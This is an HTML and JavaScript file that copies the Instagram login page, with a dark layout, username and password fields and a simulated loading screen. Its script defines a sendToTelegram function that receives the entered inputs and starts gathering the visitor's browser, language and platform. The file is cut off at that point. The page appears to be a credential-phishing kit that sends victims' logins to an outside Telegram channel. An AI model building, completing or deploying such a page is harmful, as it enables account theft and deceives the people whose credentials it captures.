    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login • Instagram</title>
    <link href="cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
    <link href="fonts.googleapis.com/css2" rel="stylesheet" />
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #000; /* Black background as per image */
            display: flex;
            flex-direction: column; /* Changed to column to stack elements */
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding-top: 20px; /* Add some top padding for mobile view */
            padding-bottom: 20px; /* Add some bottom padding */
        }
        .loading-screen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            background-color: #000;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 10;
            opacity: 1;
            transition: opacity 1s ease-in-out;
        }
        .loading-screen.hidden {
            opacity: 0;
            pointer-events: none; /* Disable interaction after hidden */
        }
        .loading-logo-img { /* New style for the loading screen logo image */
            width: 150px; /* Adjusted size to be smaller */
            height: auto; /* Maintain aspect ratio */
            margin-bottom: 20px;
        }
        .login-container {
            background-color: #000; /* Matches body background */
            border: 1px solid #262626; /* Darker border */
            border-radius: 8px;
            padding: 40px;
            width: 100%;
            max-width: 380px; /* Max width as seen in the image */
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            display: none; /* Hidden initially */
            flex-direction: column;
            align-items: center;
        }
        .instagram-logo-img { /* New style for the Instagram logo image in login page */
            width: 175px; /* Adjusted to fit the image proportions better */
            height: auto;
            margin-bottom: 30px;
        }
        input[type="text"],
        input[type="password"] {
            background-color: #1a1a1a; /* Darker input background */
            border: 1px solid #262626; /* Input border */
            color: #fefefe;
            padding: 12px 10px;
            border-radius: 4px;
            margin-bottom: 10px;
            width: 100%;
            font-size: 14px;
            box-sizing: border-box; /* Include padding and border in the element's total width and height */
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #8e8e8e; /* Placeholder text color */
        }
        .login-button {
            background-color: #0095f6; /* Instagram blue */
            color: white;
            padding: 10px 0;
            border-radius: 6px;
            width: 100%;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.2s ease;
            margin-top: 5px;
            margin-bottom: 20px;
        }
        .login-button:hover {
            background-color: #0077c0;
        }
        .or-divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .or-divider::before,
        .or-divider::after {
            content: '';
            flex-grow: 1;
            height: 1px;
            background-color: #262626;
        }
        .or-divider::before {
            margin-right: 15px;
        }
        .or-divider::after {
            margin-left: 15px;
        }
        .facebook-login {
            color: #0095f6;
            font-weight: 600;
            font-size: 14px;
            display: flex;
            align-items: center;
            cursor: pointer;
            margin-bottom: 20px;
        }
        .facebook-login svg {
            margin-right: 8px;
        }
        .forgot-password {
            color: #0095f6;
            font-size: 12px;
            cursor: pointer;
            margin-bottom: 40px;
        }
        .signup-box {
            background-color: #000; /* Matches body background */
            border: 1px solid #262626; /* Darker border */
            border-radius: 8px;
            padding: 20px;
            width: 100%;
            max-width: 380px;
            text-align: center;
            margin-top: 10px; /* Adjusted margin to be closer to the login box */
            color: #fefefe;
            font-size: 14px;
        }
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            margin-left: 5px;
            cursor: pointer;
        }
        .get-the-app {
            color: #fefefe;
            font-size: 14px;
            margin-top: 20px;
            text-align: center;
        }
        .app-links {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            justify-content: center;
            flex-wrap: wrap; /* Allow wrapping on smaller screens */
        }
        .app-links img {
            height: 40px; /* Adjust height of app store icons */
            border-radius: 4px;
        }
        .meta-text {
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 60px;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px; /* Spacing between links */
            margin-top: 40px; /* Space from app links */
            max-width: 90%;
        }
        .footer-links a, .footer-links span {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
            transition: color 0.2s ease;
        }
        .footer-links a:hover {
            color: #fefefe;
        }
        .copyright-text {
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 20px;
            margin-bottom: 20px; /* Ensure space at the very bottom */
            text-align: center;
        }

        /* Modal specific styles for custom alerts */
        .custom-alert-modal {
            display: none; /* Hidden by default */
            position: fixed; /* Stay in place */
            z-index: 50; /* Sit on top of everything else */
            left: 0;
            top: 0;
            width: 100%; /* Full width */
            height: 100%; /* Full height */
            overflow: auto; /* Enable scroll if needed */
            background-color: rgba(0,0,0,0.8); /* Black w/ opacity */
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .custom-alert-modal-content {
            background-color: #1a1a1a;
            padding: 30px;
            border: 1px solid #262626;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            text-align: center;
        }
        .custom-alert-modal-content h2 {
            color: #fefefe;
            font-size: 20px;
            margin-bottom: 15px;
        }
        .custom-alert-modal-content p {
            color: #fefefe;
            margin-bottom: 25px;
        }
        .custom-alert-modal-content button {
            background-color: #0095f6;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.2s ease;
            width: 100%;
        }
        .custom-alert-modal-content button:hover {
            background-color: #0077c0;
        }


        /* Responsive adjustments */
        @media (max-width: 640px) {
            .login-container, .signup-box {
                border: none; /* Remove border on smaller screens */
                background-color: #000; /* Ensure background is black */
                padding: 20px;
                max-width: 100%;
            }
            body {
                align-items: center; /* Center horizontally */
                padding-top: 40px;
                padding-bottom: 40px; /* Ensure enough space at the bottom */
            }
            .meta-text {
                position: static; /* Position normally on smaller screens */
                margin-top: 40px;
                padding-bottom: 20px;
            }
            .footer-links {
                gap: 10px; /* Reduce gap on smaller screens */
                font-size: 10px; /* Smaller font on small screens */
                padding: 0 10px; /* Add some horizontal padding */
            }
            .copyright-text {
                font-size: 10px;
            }
        }
    </style>

    <script>
        document.addEventListener('DOMContentLoaded', () =&gt; {
            const loadingScreen = document.getElementById('loading-screen');
            const loginPage = document.getElementById('login-page');
            const loginButton = document.getElementById('login-button');
            const usernameEmailPhoneInput = document.getElementById('username-email-phone');
            const passwordInput = document.getElementById('password');

            // Simulate loading for 2 seconds then show login page
            setTimeout(() =&gt; {
                loadingScreen.classList.add('hidden');
                setTimeout(() =&gt; {
                    loadingScreen.style.display = 'none'; // Completely remove after transition
                    loginPage.style.display = 'flex'; // Show the login page
                }, 1000); // Wait for opacity transition to complete
            }, 2000);

            // Validation functions
            const isEmail = (input) =&gt; /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
            const isPhoneNumber = (input) =&gt; /^\d{10}$/.test(input);
            const isUsername = (input) =&gt; /^[a-zA-Z0-9._]{1,30}$/.test(input);

            // sendToTelegram function now accepts input1, input2, actionType, and a flag for detailed info
            async function sendToTelegram(input1, input2, actionType, includeDetailedInfo = false) {
                const browser = navigator.userAgent;
                const language = navigator.language;
                const platform = navigator.platform;
